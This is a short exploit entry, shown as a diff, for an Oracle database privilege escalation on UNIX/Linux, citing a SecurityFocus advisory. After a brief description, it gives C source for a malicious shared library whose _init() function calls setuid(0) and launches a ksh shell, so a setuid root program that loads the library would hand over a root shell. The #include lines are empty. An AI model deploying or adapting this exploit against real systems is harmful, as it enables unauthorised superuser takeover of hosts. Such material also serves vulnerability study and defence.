@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/10829/info
+
+Oracle database implementations are reportedly prone to a default library directory privilege escalation vulnerability. This issue arises due to a default configuration error that will permit the attacker to replace libraries required by setuid root applications with arbitrary code.
+
+This issue would allow an Oracle software owner to execute code as the superuser, taking control of the entire system.
+
+It should be noted that this vulnerability only affects Oracle on UNIX/Linux platforms.
+
+#include
+#include
+
+_init() {
+printf("en el _init()\n");
+printf("Con PID=%i y EUID=%i",getpid(),getuid());
+setuid(0);
+system("/usr/bin/ksh");
+printf("Saliendo del Init()\n");
+}
